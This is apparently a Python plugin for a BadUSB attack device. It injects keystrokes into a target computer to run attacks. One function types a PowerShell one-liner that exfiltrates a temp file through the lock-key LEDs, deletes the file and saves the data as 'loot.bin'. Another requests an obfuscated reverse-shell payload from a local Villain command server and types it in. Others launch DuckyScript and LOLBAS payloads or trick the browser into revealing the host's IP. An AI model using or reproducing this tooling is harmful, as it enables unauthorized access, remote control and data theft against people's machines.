from PIL import ImageFont
from time import sleep
from core.badusb.badusb import BadUSB, DuckyScriptInterpreter
from core.utils import config
import os

# reverse shell stuff
import socket
from core.webserver.https import *
from random import randint
from threading import Thread
import json
from base64 import b64decode
from core.plugin import BasePwnhyvePlugin

class vars:

    payloadList = {}

    font = ImageFont.truetype('core/fonts/roboto.ttf', 11)

usb = BadUSB()

class Plugin(BasePwnhyvePlugin):
    def fileExfil(tpil):
        global usb
        handler = tpil.gui.usbRunPercentage(tpil) # init handler

        handler.addText("hit any key to run payload\nfile: $env:tmp/z")

        tpil.waitForKey(debounce=True)

        usb.run("powershell")
        sleep(0.125)
        usb.write(';'.join([
            "foreach($b in $(cat $env:tmp\z -En by)){$bin = [System.Convert]::ToString($b, 2);if ($bin.Length -ne 8) {$bin = '0' * (8 - $bin.Length % 8) + $bin} foreach($v in $bin.toCharArray()) { if($v -eq '1'){$o+='%{CAPSLOCK}{SCROLLLOCK}%{CAPSLOCK}'}else{$o+='{SCROLLLOCK}'} }}",
            "Add-Type -A System.Windows.Forms",
            "[System.Windows.Forms.SendKeys]::SendWait('%{NUMLOCK}')",
            "[System.Windows.Forms.SendKeys]::SendWait($o)",
            "[System.Windows.Forms.SendKeys]::SendWait('%{NUMLOCK}')"
            "rm $env:tmp\z"
        ]))

        databinary = ""
        cl = 0

        while not usb.numLock:
            sleep(0.025)

        while True:
            if usb.scrollLock:

                cl = 0

                if usb.capsLock:
                    databinary += "1"
                else:
                    databinary += "0"

                while usb.scrollLock:
                    sleep(1/(2048*1.5)) # wait for clock to be over

    
            else:
                cl += 1

                if cl == 1500:
                    print("cl reached max")
                    break

                sleep(1/(2048*1.5))

        zb = []
        d = ""
        for x in databinary:
            d += x
            if len(d) == 8:
                zb.append(d)
                d = ""
            
        print(zb)

        with open("loot.bin", "wb") as f:
            byte_sequence = bytes([int(seq, 2) for seq in zb])

            f.write(byte_sequence)
            f.flush()

        handler.exit()

    def payloads(tpil):
        global usb
        # args: [draw, disp, image]

        print("abcd")

        payloads = os.listdir("./payloads/")

        vars.payloadList["back"] = '0'

        sleep(0.5)

        a = tpil.gui.menu(payloads)

        if a == "back":
            return

        if a == None:
            return

        draw,disp,image = tpil.__getDDI__()
        dsi = DuckyScriptInterpreter(usb, "./payloads/{}".format(a), draw, disp, image)

        dsi.parse()

        dsi.handler.addText("press any key..")
        dsi.handler.exit()

        tpil.waitForKey()

    def wxHoaxShell(tpil):
        global usb
        handler = tpil.gui.usbRunPercentage(tpil) # init handler

        #payload = vil.payloadGen("windows", "wlan0", scramble=0)

        payloadSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        payloadSock.settimeout(1)
        try:
            payloadSock.connect(("127.0.0.1", 64901))
        except socket.gaierror:
            handler.addText("modified villain isnt running, run it in ssh'd shell; sudo python3 ./core/villain/villain.py")
            return

        payloadSock.sendall(json.dumps({
            "os": "windows",
            "lhost": "wlan0",
            "scramble": "2" #scramble twice
        }))
        r = payloadSock.recv(2048 * 4).decode("utf-8")
        payload = b64decode(r.encode("ascii")).decode("ascii")

        handler.setPercentage(0)

        #print(payload)
        handler.addText("executing payload")

        usb.write(payload, jitter=False, keyDelay=0, pressDelay=0) # curl our server for tcp shell

        usb.press("ENTER") # run

        sleep(0.5) # wait for cmd to finish

        usb.write("exit") # exit right after, should run in background
        usb.press("ENTER")

        handler.setPercentage(100)

        handler.addText("finished")

        tpil.waitForKey()

        handler.exit()

        return

    def lolbas(tpil):

        basedir = "./core/LOLBAS/"
        directory = basedir

        while True:
            # theres definitely a better way of doin this
            ####

            folder = tpil.gui.menu([x if os.path.isdir(x) else "" for x in os.listdir("./core/LOLBAS")])

            if folder == None: return

            directory += folder

            ###

            script = tpil.menu([x.replace(".txt", "") for x in os.listdir(directory)])

            if script == None: directory = basedir; continue

            directory += script

            break

            ###

        draw,disp,image = tpil.__getDDI__()
        dsi = DuckyScriptInterpreter(usb, directory,
                                      draw, disp, image)

        dsi.parse()

        dsi.handler.addText("press any key..")
        dsi.handler.exit()

        tpil.waitForKey()

    def pullIP(tpil):
        global usb

        port = randint(2500,30000)

        handler = tpil.gui.usbRunPercentage(tpil)
        handler.clearText()

        handler.addText("starting fake tcp-http")

        #httpHandler = HTTPServer(port=port) # init the http server
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); sock.connect(("1.1.1.1", 80)) # make socket and connect to 1.1.1.1 to get local ip
        local = sock.getsockname()[0] # pull local ip from sockname
        sock.close() # close the socket

        #httpHandler.forever() # start it
        #Thread(target=httpHandler.forever, daemon=True).start() # start it

        fakeHTTP = FakeHTTPServer(bindto=(local, port))

        handler.addText("started fake tcp-http")
        handler.addText("@{}:{}".format(local,port))
        #handler.addText("make sure chrome is open and is focused on the search (1s)")

        sleep(1)

        try:
            usb.ctrl("t") # new tab auto focuses
            usb.write("http://{}:{}/".format(local,port)) # http url
            sleep(0.25) # lil wait
            usb.press("ENTER") # enter
        except:
            handler.addText("couldn't type")
            handler.exit()
            fakeHTTP.tcp.close()
            return

        handler.addText("waiting... (5s timeout)")
        sleep(0.5) # lil wait

        try:
            client = fakeHTTP.waitFor()[1][1]
            handler.text = "I:{}\nP:{}".format(client[0], client[1]) # best formatting ever
        except Exception as e:
            print(e)
            handler.addText(str(e))

        usb.ctrl("w") # close tab
        sleep(0.25) # wait for host machine to process
        usb.ctrl("w") # twice

        usb.close()
        fakeHTTP.tcp.close()

        tpil.waitForKey()
        handler.text = "1:{0}\n2:{1}\n3:{2}\n4:{3}".format(*client[0].split(".")) # best formatting ever 2
        tpil.waitForKey()

        handler.exit()